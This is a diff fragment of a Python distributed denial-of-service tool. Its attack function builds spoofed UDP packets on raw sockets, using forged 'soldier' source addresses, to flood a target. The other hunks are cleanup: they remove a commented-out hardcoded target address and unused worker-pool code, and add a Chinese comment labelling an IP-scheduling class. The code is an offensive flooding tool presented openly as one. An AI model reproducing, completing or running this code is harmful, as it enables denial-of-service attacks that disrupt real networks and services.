@@ -39,7 +39,6 @@ def attack(soldier,target):
 	leng = 97
 	proto = ddos_type
 	payload = PAYLOAD[proto]
-	#target = '122.226.223.147'
 	sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
 	udp = UDP(randint(1, 65535), PORT[proto], payload).pack(target, soldier)
 	ip = IP(target, soldier, udp, proto=socket.IPPROTO_UDP).pack()
@@ -80,11 +79,7 @@ def ddos_sub():
 	ddos_sub()
 
 	
-				
-		
-		
-		
-
+#IP调度类
 #Getip start-------------------------
 class GetIp(object):
 	global soldier_dir
@@ -148,26 +143,8 @@ class GetIp(object):
 
 
 if __name__ == '__main__':
-	soldier = [];
-	i = 0;
-	#p = multiprocessing.Pool(processes=10)
-	soldier_all = open('new.txt','r')
-	txt = [[{'data':'192.168.0.1','dst':'8.8.8.8'},{'data':'192.168.0.1','dst':'8.8.8.8'}],[{'data':'192.168.0.2','dst':'9.9.9.9'}]]
 
-			
 	ddos_sub()
-	#GetIp = GetIp('192.168.1.0/24')
-	#print GetIp.att_data
-	'''
-	for line in soldier_all:
 
-		soldier.append(line);
-		i += 1
-		if i%200 == 0:
-			p.apply_async(ddos_1, args=(soldier,))
-			#ddos_1(soldier)
-			soldier = [];
-	
-	'''
 	while 1:
-   		pass
+		pass
